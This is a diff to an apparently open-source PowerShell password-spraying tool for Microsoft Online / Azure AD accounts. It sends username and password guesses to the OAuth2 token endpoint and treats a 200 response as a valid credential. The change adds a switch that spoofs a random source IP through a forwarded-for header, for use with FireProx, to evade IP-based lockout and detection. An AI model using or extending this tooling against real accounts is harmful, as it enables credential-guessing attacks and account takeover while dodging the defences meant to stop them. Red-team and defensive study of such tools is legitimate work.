@@ -33,6 +33,10 @@
         
         The URL to spray against. Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.
     
+    .PARAMETER XForwarded
+        
+        Set a randomized IPv4 value to the X-My-X-Forwarded-For header. Useful for integration with fireprox as this allows for spoofing the X-Forwarded-For header.
+    
     .EXAMPLE
         
         C:\PS> Invoke-MSOLSpray -UserList .\userlist.txt -Password Winter2020
@@ -48,8 +52,6 @@
         This command uses the specified FireProx URL to spray from randomized IP addresses and writes the output to a file. See this for FireProx setup: https://github.com/ustayready/fireprox.
 #>
   Param(
-
-
     [Parameter(Position = 0, Mandatory = $False)]
     [string]
     $OutFile = "",
@@ -69,7 +71,11 @@
 
     [Parameter(Position = 4, Mandatory = $False)]
     [switch]
-    $Force
+    $Force,
+
+    [Parameter(Position = 5, Mandatory = $False)]
+    [switch]
+    $XForwarded
   )
     
     $ErrorActionPreference= 'silentlycontinue'
@@ -94,6 +100,19 @@
         # Setting up the web request
         $BodyParams = @{'resource' = 'https://graph.windows.net'; 'client_id' = '1b730954-1685-4b74-9bfd-dac224a7b894' ; 'client_info' = '1' ; 'grant_type' = 'password' ; 'username' = $username ; 'password' = $password ; 'scope' = 'openid'}
         $PostHeaders = @{'Accept' = 'application/json'; 'Content-Type' =  'application/x-www-form-urlencoded'}
+        if ($XForwarded -eq $true) {
+            # Generate random IP (Some invalid/internal IPs may be generated)
+            $randIP = ""
+            $randIP += Get-Random -Minimum 0 -Maximum 255
+            $randIP += "."
+            $randIP += Get-Random -Minimum 0 -Maximum 255
+            $randIP += "."
+            $randIP += Get-Random -Minimum 0 -Maximum 255
+            $randIP += "."
+            $randIP += Get-Random -Minimum 0 -Maximum 255
+            $PostHeaders['X-My-X-Forwarded-For'] = $randIP
+        }
+
         $webrequest = Invoke-WebRequest $URL/common/oauth2/token -Method Post -Headers $PostHeaders -Body $BodyParams -ErrorVariable RespErr 
 
         # If we get a 200 response code it's a valid cred
